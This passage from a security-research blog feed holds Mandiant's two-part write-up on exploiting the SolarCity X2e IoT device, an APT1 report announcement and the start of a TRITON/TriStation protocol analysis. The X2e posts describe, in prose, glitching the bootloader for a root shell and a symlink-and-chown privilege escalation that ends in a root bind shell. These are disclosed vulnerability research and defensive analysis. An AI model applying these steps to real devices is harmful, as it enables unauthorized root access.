  <br /> <span class="type-XS">Figure 16: binwalk scan of fixed NAND dump</span></p>
 <p>This time, we see only one JFFS2 filesystem, at the very round
  offset of <span class="code">0x880000</span>. Using the extraction
    (<span class="code">-e</span>) feature of <span
  class="code">binwalk</span>, we can now obtain parsed versions of the
  U-Boot bootloader, Linux kernel, and JFFS2 system.</p>
 <p>The final hurdle we need to overcome is mounting the extracted JFFS2
  filesystem in a way that allows us to explore the contents. On Linux,
  the easiest way to perform this is to use the <span
  class="code">mtd</span>, <span class="code">mtdblock</span>, and <span
  class="code">nandsim</span> <a
    href="https://daemons.net/linux/storage/mtd.html">kernel
  modules</a>. The <span class="code">nandsim</span> module simulates a
  given NAND device and uses the <span class="code">mtd</span> and JFFS2
  subsystems to parse and manage appropriately. The key piece of
  information that needs to be passed to the <span
  class="code">nandsim</span> module is the ONFI chip identifier, which
  can be obtained from the NAND datasheet or by requesting the ID from
  the IC using a generic reader (like the XGecu Pro used in the Data
  Extraction section). A list of supported IDs is also provided by the
    <span class="code">mtd</span> <a
  href="http://www.linux-mtd.infradead.org/nand-data/nanddata.html">maintainers</a>.
  Getting the parameters correct is a bit of luck and magic and may
  require you to compile your own version of the <span
  class="code">nandsim</span> module; that process will not be covered
  in this post.</p>
 <p>Figure 17 shows the steps required to simulate the correct Spansion
  NAND and mount the JFFS2 filesystem in the form of a <span
  class="code">Makefile</span> target.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig17.png" alt="" />
  <br /> <span class="type-XS">Figure 17: Makefile target to mount JFFS2 filesystem</span></p>
 <p>By running <span class="code">make mount-jffs2</span>, we can
  quickly prep and mount the JFFS2 filesystem and explore the contents
  as we would any filesystem.</p>
 <h5>Accessing the Filesystem</h5>
 <p>In the last section of this post, we’ll walk through our analysis of
  the JFFS2 filesystem. Remember that our end goal is to obtain a
  remotely exploitable bug that will permit privileged code execution.
  With that in mind, some areas of interest are running
  daemons/processes, system startup logic, and credentials for services
  listening on the network. The first stop was reviewing the <span
  class="code">/etc/shadow</span> file to see if there were password
  hashes for the <span class="code">root</span> user as well as other
  system users. A quick check of this file determined there was no
  password hash for the <span class="code">root</span> user, which
  indicated we would not be able to authenticate using password
  authentication. We noticed that two other password hashes were
  present, for the <span class="code">addpd</span> and <span
  class="code">python</span> users, shown in Figure 18.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig18.png" alt="" />
  <br /> <span class="type-XS">Figure 18: Connects of /etc/shadow</span></p>
 <p>The <span class="code">addpd</span> user had a weak default password
  but was unable to authenticate using remote methods, and we were
  ultimately unable to crack the <span class="code">python</span> user’s
  hash using internal GPU-based servers.</p>
 <p>Additionally, we were interested in processes that are launched
  during system boot or post-boot. The directory <span
  class="code">/WEB/python/</span> contained a ZIP archive called <span
  class="code">_x2e.zip</span>, which contained over 200 compiled Python
  scripts (PYC files), which were loaded on system boot. Using the
  decompiler <a href="https://github.com/wibiti/uncompyle2"><span
  class="code">uncompyle2</span></a>, we unpacked these files for
  review. One file that stood out by name was <span
  class="code">password_manager.pyc</span>, a file used to reset the
  login password upon successful boot-up. The file contained five
  hardcoded and plaintext credentials that mapped to the <span
  class="code">python</span> system user. These credentials could be
  used to access the web interface and SSH, shown in Figure 19. Mandiant
  confirmed different passwords were used for different versions and
  connectivity states. Mandiant reported this to SolarCity and was
  assigned the CVE number CVE-2020-9306.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity1/1fig19.png" alt="" />
  <br /> <span class="type-XS">Figure 19: Hardcoded credentials in password_manager.pyc</span></p>
 <p>With the correct password, we were finally able to connect to the
  web and SSH ports on a running X2e, but unfortunately only as the
  less-privileged <span class="code">python</span> system user. While
  this was a great start, it didn’t satisfy our final objective, which
  was to remotely compromise the X2e as a privileged user. In Part Two
  of this blog series, we will explore additional avenues to further
  compromise the X2e.</p>
 <h4>Conclusion</h4>
 <p>In Part One of this two-part blog series, we covered an overview of
  the X2e, our initial network-based reconnaissance, PCB inspection
  techniques, physical debugging interface probing, chip-off techniques,
  and firmware analysis. Using these methodologies, we were successfully
  able to remotely compromise the X2e device as a non-administrative
  user due to hardcoded credentials (CVE-2020-9306). In Part Two, we
  will re-investigate physical attacks against the X2e in the form of
  glitch attacks, re-explore the U-Boot bootloader, and finally
  demonstrate an attack to remotely compromise the X2e device as a
  <b>privileged</b> user.</p>
 <p>To continue reading, check out <a
    href="/content/fireeye-www/en_US/blog/threat-research/2021/02/solarcity-exploitation-of-x2e-iot-device-part-two.html">Part
    Two now</a>. </p>
http://www.fireeye.com/blog/threat-research/2021/02/solarcity-exploitation-of-x2e-iot-device-part-one.html2021-02-17T13:00:00.000Z2021-02-18T18:59:10.580ZMandiant Exposes APT1 – One of China's Cyber Espionage Units &amp;
Releases 3,000 Indicatorsnoemail@noemail.orgDan Mcwhorter<div class="c00 c00v1">
  <p>Today, The Mandiant® Intelligence Center™ released an <a
      href="/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf">unprecedented
    report</a> exposing APT1's multi-year, enterprise-scale computer
    espionage campaign. APT1 is one of dozens of threat groups Mandiant
    tracks around the world and we consider it to be one of the most
    prolific in terms of the sheer quantity of information it has
  stolen.</p> <p>Highlights of the report include:</p> <ul> <li>Evidence
      linking APT1 to China's 2nd Bureau of the People's Liberation Army
      (PLA) General Staff Department's (GSD) 3rd Department (Military
      Cover Designator 61398).</li> <li>A timeline of APT1 economic
      espionage conducted since 2006 against 141 victims across multiple
    industries.</li> <li>APT1's modus operandi (tools, tactics,
      procedures) including a <a
        href="https://www.youtube.com/watch?v=mYaTCvA2VLQ&amp;feature=youtu.be">compilation
        of videos showing actual APT1 activity</a>.</li> <li>The
      timeline and details of over 40 APT1 malware families.</li>
      <li>The timeline and details of APT1's extensive attack
    infrastructure.</li> </ul> <p>Mandiant is also releasing a digital
    appendix with more than 3,000 indicators to bolster defenses against
    APT1 operations. This appendix includes:</p> <ul> <li>Digital
      delivery of over 3,000 APT1 indicators, such as domain names, and
      MD5 hashes of malware.</li> <li>Thirteen (13) X.509 encryption
      certificates used by APT1.</li> <li>A set of APT1 Indicators of
      Compromise (IOCs) and detailed descriptions of over 40 malware
      families in APT1's arsenal of digital weapons.</li> <li>IOCs that
      can be used in conjunction with <a
      href="/content/fireeye-www/en_US/services/freeware/redline.html">Redline</a>™,
      Mandiant's free host-based investigative tool, or with <a
        href="http://www.mandiant.com/products/platform/">Mandiant
        Intelligent Response® (MIR)</a>, Mandiant's commercial
      enterprise investigative tool.</li> </ul> <p>The scale and impact
    of APT1's operations compelled us to write this report. The decision
    to publish a significant part of our intelligence about Unit 61398
    was a painstaking one. What started as a &quot;what if&quot;
    discussion about our traditional non-disclosure policy quickly
    turned into the realization that the positive impact resulting from
    our decision to expose APT1 outweighed the risk of losing much of
    our ability to collect intelligence on this particular APT group. It
    is time to acknowledge the threat is originating from China, and we
    wanted to do our part to arm and prepare security professionals to
    combat the threat effectively. The issue of attribution has always
    been a missing link in the public's understanding of the landscape
    of APT cyber espionage. Without establishing a solid connection to
    China, there will always be room for observers to dismiss APT
    actions as uncoordinated, solely criminal in nature, or peripheral
    to larger national security and global economic concerns. We hope
    that this report will lead to increased understanding and
    coordinated action in countering APT network breaches.</p> <p>We
    recognize that no one entity can understand the entire complex
    picture that many years of intense cyber espionage by a single group
    creates. We look forward to seeing the surge of data and
    conversations a report like this will likely generate.</p> <p>Dan
  McWhorter</p> <p>Managing Director, Threat Intelligence</p> </div>
http://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html2013-02-19T07:00:45.000Z2021-02-19T20:14:48.551ZShining a Light on SolarCity: Practical Exploitation of the X2e IoT
Device (Part Two)noemail@noemail.orgJake Valletta<p>In this post, we continue our analysis of the <a
    href="http://cms.digi.com/resources/documentation/digidocs/90001537/references/r_connectport_x2e.htm">SolarCity
    ConnectPort X2e</a> Zigbee device (referred to throughout as X2e
  device). In <a
    href="/content/fireeye-www/en_US/blog/threat-research/2021/02/solarcity-exploitation-of-x2e-iot-device-part-one.html">Part
  One</a>, we discussed the X2e at a high level, performed initial
  network-based attacks, then discussed the hardware techniques used to
  gain a remote shell on the X2e device as a non-privileged system user.
  In this segment, we’ll cover how we obtained a privileged shell on the
  device locally using power glitching attacks, and explore <a
  href="https://nvd.nist.gov/vuln/detail/CVE-2020-12878">CVE-2020-12878</a>,
  a vulnerability we discovered that permitted remote privilege
  escalation to the <span class="code">root</span> user. Combined with
    <a
  href="https://nvd.nist.gov/vuln/detail/CVE-2020-9306">CVE-2020-9306</a>
  (discussed in Part One), this would result in a complete remote
  compromise of the X2e device.</p>
 <h4>Technical Analysis</h4>
 <h5>Recap</h5>
 <p>Before we dive into next steps, let’s recap where we left off:</p>
 <ul> <li>The X2e has an exposed universal asynchronous transmit/receive
    (UART) interface, which allows a physically connected user to view
    (but not interrupt) the Das U-Boot (U-Boot) boot process, and given
    proper credentials, authenticate to the Linux operating system.
    Since we do not have <span class="code">root</span> credentials, we
    put this thread on the backburner.</li> <li>We have a full NAND dump
    of the Spansion raw flash, which includes boot configuration,
    bootloader firmware, filesystems, and the Linux kernel image. This
    was used previously in Part One to obtain the hardcoded credential
    for the <span class="code">python</span> user.</li> </ul>
 <p>Knowing that UART is present and access to the bootloader would be
  extremely valuable, we decided to revisit that thread.</p>
 <h4>Gaining Privileged Access Locally</h4>
 <h5>Revisiting the Bootloader</h5>
 <p>Figure 1 shows the U-Boot boot process displayed while connected via
  UART connection. In some cases, it is possible to send keyboard input
  to the device during a set period (usually one to four seconds) when
  the bootloader presents the message, “Hit any key to stop autoboot,”
  which interrupts the boot process and drops the user into a U-Boot
  shell. On the X2e, this feature has been disabled by setting the
  U-Boot configuration parameter <a
      href="https://lists.denx.de/pipermail/u-boot/2015-October/229631.html"><span
    class="code">CONFIG_BOOTDELAY</span> to <span class="code">0</span></a>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Uninterruptable U-Boot
    bootloader output</span></p>
 <p>One attack that has been documented to be successful to disrupt
  autoboot is to manipulate the bootloader’s ability to access the flash
  storage during the boot process. In certain circumstances where the
  U-Boot bootloader is unable to access its own configuration, it fails
  into a default environment, which may be less restricted. We decided
  to see if this would be possible on the X2e.</p>
 <p>These attacks, known as glitch attacks (or more officially known as
  fault-injection), are a type of side channel attack that attempts to
  cause a microcontroller unit (MCU) to skip instructions, perform wrong
  instructions, or fail to access <a
    href="https://blog.nviso.eu/2020/02/21/iot-hacking-field-notes-1-intro-to-glitching-attacks/">flash
  memory</a>. Various types of glitching attacks exist including
  electrical, thermal, and radiation. Based on our objective, we opted
  to try glitching the power between the MCU and the Spansion NAND
  flash. Note that glitch attacks can often cause damage to the
  components on a board or put the device in an unusable state. These
  types of attacks should be tested as either a last resort or against a
  secondary device you are comfortable with damaging.</p>
 <h5>Glitching the Bootloader</h5>
 <p>Based on previous research in <a
    href="https://www.brettlischalk.com/posts/nand-glitching-wink-hub-for-root">this
  domain</a>, we opted to target the data lines (I/O) between the MCU
  and NAND flash. Recall from Part One that the NAND flash on the X2e
  was the Spansion S34ML01G1, which was a 63-pin ball grid array (BGA)
  package. This chip is capable of supporting both 8-bit and 16-bit bus
  width, which corresponds to the number of I/O lines utilized. By using
  the <a
    href="https://datasheetspdf.com/datasheet/S34ML01G1.html">datasheet
    for the flash</a> and then querying the ONFI Device ID of our chip,
  we determined our chip was utilizing the 8-bit configuration, meaning
  eight I/O lines were present between the NAND flash and the MCU. For
  this attack, we focused on manipulating the power on the first (<span
  class="code">I/O0</span>) data line. Figure 2 shows the configuration
  of the BGA-63 pins, with <span class="code">I/O0</span> highlighted.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Identifying I/O0 for NAND chip
    in the Spansion datasheet</span></p>
 <p>Because the pins are actually underneath the flash package, we
  needed to find an exposed lead that corresponded to <span
  class="code">I/O0</span> elsewhere on the PCB. One such method for
  tracing connections across a PCB is a continuity test. A continuity
  test (using a multimeter) sends a low current electrical signal across
  two points and produces an audible beep if the points are connected.
  Using this technique, we located an exposed test point (known as a
  via) on the bottom of the PCB. Figure 3 shows the <span
  class="code">I/O0</span> pin on the top of the PCB (under the NAND
  chip), and Figure 4 shows the <span class="code">I/O0</span> pin
  exposed on the bottom of the PCB.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: I/O0 on top of PCB (under NAND chip)</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: I/O0 on bottom of PCB</span></p>
 <p>With exposed access to <span class="code">I/O0</span> located, we
  experimented with connecting this pin directly to a known ground
    (<span class="code">GND</span>) pin at various points during the
  boot process. Figure 5 shows the device powering on with the metal
  tweezers connecting <span class="code">I/O0</span> to <span class="code">GND</span>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig5.jpg" alt="" />
  <br /> <span class="type-XS">Figure 5: Shorting I/O0 to GND</span></p>
 <p>While connected to the UART interface, we noted several different
  outcomes. When shorting the pin immediately after powering on, the
  device failed to produce any output or boot. When shorting after the
  bootloader finished loading (and handing off to the Linux kernel), the
  device would also force reboot. However, when timed perfectly between
  the bootloader loading and attempting to read its configuration, we
  noted that the bootloader would present different output, and the
  option to interrupt the boot process was possible with a four-second
  delay. By pressing keyboard input, we were successfully able to drop
  into a U-Boot shell, which is shown in Figure 6.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig6.jpg" alt="" />
  <br /> <span class="type-XS">Figure 6: Access to U-Boot bootloader shell</span></p>
 <p>While this was great progress, we noted that the current failback
  bootloader configuration was completely inoperable and certain NAND
  blocks had been marked as bad (as expected). To get our device back to
  a working state, we needed to revisit the NAND dump we generated in
  Part One.</p>
 <h5>Repairing the Bootloader Configuration</h5>
 <p>While the current configuration provided us a working shell, we
  needed to fix the damage we had done. This was performed in two steps:
  fixing the mistakenly marked bad blocks and then rebuilding the
  configuration. In our case, the <span class="code">nand</span> utility
  and its sub-commands <span class="code">read</span>, <span
  class="code">write</span>, and <span class="code">scrub</span> allowed
  us to inspect and manipulate pages and blocks of the NAND. The <span
    class="code">nand scrub</span> command with a valid offset and size
  could be used to completely reset a segment of the NAND, which removed
  any bad block markers. The next challenge was determining what needed
  to be replaced in the damaged blocks and rebuilding the configuration.</p>
 <p>Since we had a valid NAND image, we revisited the sections read by
  the bootloader to determine what changes were needed. The format did
  not match a known format, so we wrote a simple parser in Python to
  read the binary structure, shown in Figure 7.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: Parsing bootloader nvram
    configuration from flash</span></p>
 <p>With details of how the configuration should look, we used the <span
    class="code">nand write</span> to rebuild this section, byte by byte
  with the correct details. We also set the boot delay to be four
  seconds, so that we could always interrupt the bootloader once the new
  configuration was committed. Once we confirmed our changes were
  stable, we saved the configuration to flash and could access the
  bootloader without performing the aforementioned glitch attack.</p>
 <h5>Accessing Linux as root User</h5>
 <p>Now that we have unrestricted access to the bootloader, we can
  finally influence the rest of the boot process and achieve a
  privileged shell. We alluded to this in Part One, but the easiest way
  to turn an unlocked U-Boot shell into a <span class="code">root</span>
  Linux shell is to adjust the boot arguments that U-Boot passes to the
  Linux kernel. In our case, this was accomplished by using the <span
  class="code">setenv</span> utility to change the <span
  class="code">std_bootarg</span> environment variable to be <span
  class="code">init=/bin/sh</span> and instructing U-Boot to resume the
  standard boot process. Figure 8 shows the Linux shell presented over UART.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig8.jpg" alt="" />
  <br /> <span class="type-XS">Figure 8: root shell after bootloader</span></p>
 <p>At this point, we’ve demonstrated a repeatable method for achieving
  local privilege escalation. In the final segment, we’ll complete our
  attack by exploring an avenue to remotely escalate privileges.</p>
 <h5>Gaining Privileged Access Remotely</h5>
 <p>Since the X2e has only two available listening network services, it
  makes sense to reinvestigate these services. During Part One, we
  identified hardcoded credentials for the limited user <span
  class="code">python</span>. This was useful for initial probing of the
  device while it was running, but where do we go from here?</p>
 <p>Embedded devices typically only have a handful of users, with a
  majority of functionality being performed by the <span
  class="code">root</span> user. This presents an interesting
  opportunity for us to abuse overlap between actions performed by the
    <span class="code">root</span> user on contents owned and controlled
  by the <span class="code">python</span> user.</p>
 <p>By reviewing the boot process, we noted a large number of custom
    <span class="code">init</span> scripts in the <span
  class="code">/etc/init.d/</span> directory. These scripts are executed
  at system start by the <span class="code">root</span> user and were
  responsible for starting daemons and ensuring directories or files
  exist. One file in particular, <span
  class="code">/etc/init.d/S50dropbear.sh</span>, was interesting to us,
  as it appeared to perform a number of actions on files within the
  directory specified by the <span class="code">$PYTHON_HOME</span>
  variable, which was <span class="code">/WEB/python/</span>, shown in
  Figure 9.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig9.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Unsafe operations on
    $PYTHON_HOME directory</span></p>
 <p>At first glance this may seem benign but considering that the <span
  class="code">/WEB/python/</span> directory is controllable by the
    <span class="code">python</span> user, it means that we can
  potentially control actions taken by <span class="code">root</span>.
  More specifically, the <span class="code">chown</span> operation is
  dangerous, as the previous <span class="code">mkdir</span> command can
  fail silently and result in an unsafe <span class="code">chown</span>
  operation. To weaponize this, we can use symbolic links to point the
    <span class="code">/WEB/python/.ssh/</span> to other areas of the
  filesystem and coerce the <span class="code">root</span> process into
    <span class="code">chown</span>’ing these files to be owned by the
    <span class="code">python</span> user. The process we took to
  exploit this was as follows:</p>
 <ol> <li>Authenticate over SSH using hardcoded <span
    class="code">python</span> user credentials.</li> <li>Create a
    symbolic link, <span class="code">/WEB/python/.ssh</span>, that
    points to <span class="code">/etc/init.d/</span>.</li> <li>Reboot
    the X2e, forcing the system to re-execute <span
  class="code">/etc/init.d/S50dropbear.sh</span>.</li> <li>After boot
    completes, create a malicious <span class="code">init</span> script
    in <span class="code">/etc/init.d/</span> as the <span
    class="code">python</span> user.</li> <li>Reboot the X2e, forcing
    the system to execute the new <span class="code">init</span>
  script.</li> </ol>
 <p>While not the cleanest approach (it requires two reboots), it
  accomplishes the goal of achieving code execution as <span
  class="code">root</span>. Figure 10 shows the output of our proof of
  concept. In this case, our malicious <span class="code">init</span>
  script spawned a bind shell on TCP port 8080, so that we could connect
  in as <span class="code">root</span>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solarcity2/2fig10.jpg" alt="" />
  <br /> <span class="type-XS">Figure 10: Exploiting chown vulnerability
    to gain shell as user root</span></p>
 <p>And there we have it: a remote connection as root, by abusing two
  separate vulnerabilities. While not explored in this series, another
  viable avenue of attack would be to explore potential vulnerabilities
  in the web server listening on TCP ports 80 and 443; however, this was
  not an approach that we took.</p>
 <h4>Conclusion</h4>
 <p>We covered a wide variety of topics in this two-part series, including:</p>
 <ul> <li>Physical device inspection</li> <li>Identifying and exploring
    physical debugging interfaces (UART)</li> <li>Chip-off techniques to
    remove the NAND storage</li> <li>Binary analysis of the filesystems
    and bootloader configurations</li> <li>Power glitch attacks against
    the U-Boot bootloader</li> <li>Linux user space privilege
  escalation</li> </ul>
 <p>We hope that readers were able to learn from our experiences with
  the X2e and will be inspired to use these techniques in their own
  analysis. Finally, Mandiant would like to thank both Tesla/SolarCity
  and Digi International for their efforts to remediate these
  vulnerabilities and for their cooperation with releasing this blog series.</p>
http://www.fireeye.com/blog/threat-research/2021/02/solarcity-exploitation-of-x2e-iot-device-part-two.html2021-02-17T13:00:00.000Z2021-02-18T19:00:30.996ZA Totally Tubular Treatise on TRITON and TriStationnoemail@noemail.orgSteve Miller<h4>Introduction</h4>
 <p>In December 2017, FireEye's <a
  href="https://www.fireeye.com/services.html">Mandiant</a> discussed an
  incident response involving the <a
    href="https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html">TRITON
  framework</a>. The TRITON attack and many of the publicly discussed
  ICS intrusions involved routine techniques where the threat actors
  used only what is necessary to succeed in their mission. For both
  INDUSTROYER and TRITON, the attackers moved from the IT network to the
  OT (operational technology) network through systems that were
  accessible to both environments. Traditional malware backdoors,
  Mimikatz distillates, remote desktop sessions, and other
  well-documented, easily-detected attack methods were used throughout
  these intrusions.</p>
 <p>Despite the routine techniques employed to gain access to an OT
  environment, the threat actors behind the TRITON malware framework
  invested significant time learning about the Triconex Safety
  Instrumented System (SIS) controllers and TriStation, a proprietary
  network communications protocol. The investment and purpose of the
  Triconex SIS controllers leads Mandiant to assess the attacker's
  objective was likely to build the capability to cause physical consequences.</p>
 <p>TriStation remains closed source and there is no official public
  information detailing the structure of the protocol, raising several
  questions about how the TRITON framework was developed. Did the actor
  have access to a Triconex controller and TriStation 1131 software
  suite? When did development first start? How did the threat actor
  reverse engineer the protocol, and to what extent? What is the
  protocol structure?</p>
 <p>FireEye’s Advanced Practices Team was born to investigate adversary
  methodologies, and to answer these types of questions, so we started
  with a deeper look at the TRITON’s own Python scripts.</p>
 <p>Glossary:</p>
 <ul style="list-style-position: inside;"> <li>TRITON – Malware
    framework designed to operate Triconex SIS controllers via the
    TriStation protocol.</li> <li>TriStation – UDP network protocol
    specific to Triconex controllers.</li> <li>TRITON threat actor – The
    human beings who developed, deployed and/or operated TRITON.</li> </ul>
 <h4>Diving into TRITON's Implementation of TriStation</h4>
 <p>TriStation is a proprietary network protocol and there is no public
  documentation detailing its structure or how to create software
  applications that use TriStation. The current TriStation UDP/IP
  protocol is little understood, but natively implemented through the
  TriStation 1131 software suite. TriStation operates by UDP over port
  1502 and allows for communications between designated masters (PCs
  with the software that are “engineering workstations”) and clients
  (Triconex controllers with special communications modules) over a network.</p>
 <p>To us, the Triconex systems, software and associated terminology
  sound foreign and complicated, and the TriStation protocol is no
  different. Attempting to understand the protocol from ground zero
  would take a considerable amount of time and reverse engineering
  effort – so why not learn from TRITON itself? With the TRITON
  framework containing TriStation communication functionality, we
  pursued studying the framework to better understand this mysterious
  protocol. Work smarter, not harder, amirite?</p>
 <p>The <a
    href="https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html">TRITON
  framework</a> has a multitude of functionalities, but we started with
  the basic components:</p>
 <ul style="list-style-position: inside;"> <li>TS_cnames.pyc # Compiled
    at: 2017-08-03 10:52:33</li> <li>TsBase.pyc # Compiled at:
    2017-08-03 10:52:33</li> <li>TsHi.pyc # Compiled at: 2017-08-04
  02:04:01</li> <li>TsLow.pyc # Compiled at: 2017-08-03 10:46:51</li> </ul>
 <p>TsLow.pyc (Figure 1) contains several pieces of code for error
  handling, but these also present some cues to the protocol structure.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig1.png" />
  <br /> <span class="type-XS">Figure 1: TsLow.pyc function print_last_error()</span></p>
 <p>In the TsLow.pyc’s function for print_last_error we see error
  handling for “TCM Error”. This compares the TriStation packet value at
  offset 0 with a value in a corresponding array from TS_cnames.pyc
  (Figure 2), which is largely used as a “dictionary” for the protocol.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig2.png" />
  <br /> <span class="type-XS">Figure 2: TS_cnames.pyc TS_cst array</span></p>
 <p>From this we can infer that offset 0 of the TriStation protocol
  contains message types. This is supported by an additional function,
  tcm_result, which declares type, size = struct.unpack('&lt;HH',
  data_received[0:4]), stating that the first two bytes should be
  handled as integer type and the second two bytes are integer size of
  the TriStation message. This is our first glimpse into what the threat
  actor(s) understood about the TriStation protocol.</p>
 <p>Since there are only 11 defined message types, it really doesn't
  matter much if the type is one byte or two because the second byte
  will always be 0x00.</p>
 <p>We also have indications that message type 5 is for all Execution
  Command Requests and Responses, so it is curious to observe that the
  TRITON developers called this “Command Reply.” (We won’t understand
  this naming convention until later.)</p>
 <p>Next we examine TsLow.pyc’s print_last_error function (Figure 3) to
  look at “TS Error” and “TS_names.” We begin by looking at the ts_err
  variable and see that it references ts_result.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig3.png" />
  <br /> <span class="type-XS">Figure 3: TsLow.pyc function
    print_last_error() with ts_err highlighted</span></p>
 <p>We follow that thread to ts_result, which defines a few variables in
  the next 10 bytes (Figure 4): dir, cid, cmd, cnt, unk, cks, siz =
  struct.unpack('&lt;, ts_packet[0:10]). Now things are heating up. What
  fun. There’s a lot to unpack here, but the most interesting thing is
  how this piece script breaks down 10 bytes from ts_packet into
  different variables.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig4.png" />
  <br /> <span class="type-XS">Figure 4: ts_result with ts_packet header
    variables highlighted</span></p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig5.png" />
  <br /> <span class="type-XS">Figure 5: tcm_result</span></p>
 <p>Referencing tcm_result (Figure 5) we see that it defines type and
  size as the first four bytes (offset 0 – 3) and tcm_result returns the
  packet bytes 4:-2 (offset 4 to the end minus 2, because the last two
  bytes are the CRC-16 checksum). Now that we know where tcm_result
  leaves off, we know that the ts_reply “cmd” is a single byte at offset
  6, and corresponds to the values in the TS_cnames.pyc array and
  TS_names (Figure 6). The TRITON script also tells us that any integer
  value over 100 is a likely “command reply.” Sweet.</p>
 <p>When looking back at the ts_result packet header definitions, we
  begin to see some gaps in the TRITON developer's knowledge: dir, cid,
  cmd, cnt, unk, cks, siz = struct.unpack('&lt;, ts_packet[0:10]). We're
  clearly speculating based on naming conventions, but we get an
  impression that offsets 4, 5 and 6 could be &quot;direction&quot;,
  &quot;controller ID&quot; and &quot;command&quot;, respectively.
  Values such as &quot;unk&quot; show that the developer either did not
  know or did not care to identify this value. We suspect it is a
  constant, but this value is still unknown to us.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig6.png" />
  <br /> <span class="type-XS">Figure 6: Excerpt TS_cnames.pyc TS_names
    array, which contain TRITON actor’s notes for execution command
    function codes</span></p>
 <h4>TriStation Protocol Packet Structure</h4>
 <p>The TRITON threat actor’s knowledge and reverse engineering effort
  provides us a better understanding of the protocol. From here we can
  start to form a more complete picture and document the basic
  functionality of TriStation. We are primarily interested in message
  type 5, Execution Command, which best illustrates the overall
  structure of the protocol. Other, smaller message types will have
  varying structure.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/TritonTreatise/Fig7.png" />
  <br /> <span class="type-XS">Figure 7: Sample TriStation
    &quot;Allocate Program&quot; Execution Command, with color
    annotation and protocol legend</span></p>
 <h4>Corroborating the TriStation Analysis</h4>
 <p>Minute discrepancies aside, the TriStation structure detailed in
  Figure 7 is supported by other public analyses. Foremost, researchers
  from the Coordinated Science Laboratory (CSL) at University of
  Illinois at Urbana-Champaign published a 2017 paper titled &quot;<a
    href="https://ieeexplore.ieee.org/iel7/7919908/7920579/07920614.pdf">Attack
    Induced Common-Mode Failures on PLC-based Safety System in</a> a
  Nuclear Power Plant&quot;. The CSL team mentions that they used the
  Triconex System Access Application (TSAA) protocol to reverse engineer
  elements of the TriStation protocol. TSAA is a protocol developed by
  the same company as TriStation. Unlike TriStation, the TSAA protocol
  structure is described within official documentation. CSL assessed
  similarities between the two protocols would exist and they leveraged
  TSAA to better understand TriStation. The team's overall research and
  analysis of the general packet structure aligns with our
  TRITON-sourced packet structure.</p>
 <p>There are some awesome blog posts and whitepapers out there that
  support our findings in one way or another. Writeups by <a
    href="https://www.midnightbluelabs.com/blog/2018/1/16/analyzing-the-triton-industrial-malware">Midnight
    Blue Labs</a>, <a
  href="https://www.accenture.com/t20180123T095554Z__w__/us-en/_acnmedia/PDF-46/Accenture-Security-Triton-Trisis-Threat-Analysis.pdf">Accenture</a>,
  and US-CERT each explain how the TRITON framework relates to the
  TriStation protocol in superb detail.</p>
 <h4>TriStation's Reverse Engineering and TRITON's Development</h4>
 <p>When TRITON was discovered, we began to wonder how the TRITON actor
  reverse engineered TriStation and implemented it into the framework.
  We have a lot of theories, all of which seemed plausible: Did they
  build, buy, borrow, or steal? Or some combination thereof?</p>
 <p>Our initial theory was that the threat actor purchased a Triconex
  controller and software for their own testing and reverse engineering
  from the &quot;ground up&quot;, although if this was the case we do
  not believe they had a controller with the exact vulnerable firmware
  version, else they would have had fewer problems with TRITON in
  practice at the victim site. They may have bought or used a demo
  version of the TriStation 1131 software, allowing them to reverse
  engineer enough of TriStation for the framework. They may have stolen
  TriStation Python libraries from ICS companies, subsidiaries or system
  integrators and used the stolen material as a base for TriStation and
  TRITON development. But then again, it is possible that they borrowed
  TriStation software, Triconex hardware and Python connectors from
  government-owned utility that was using them legitimately.</p>
 <p>Looking at the raw TRITON code, some of the comments may appear
  oddly phrased, but we do get a sense that the developer is clearly
  using many of the right vernacular and acronyms, showing smarts on PLC
  programming. The TS_cnames.pyc script contains interesting typos such
  as 'Set lable', 'Alocate network accepted', 'Symbol table ccepted' and
  'Set program information reponse'. These appear to be normal human
  error and reflect neither poor written English nor laziness in coding.
  The significant amount of annotation, cascading logic, and robust
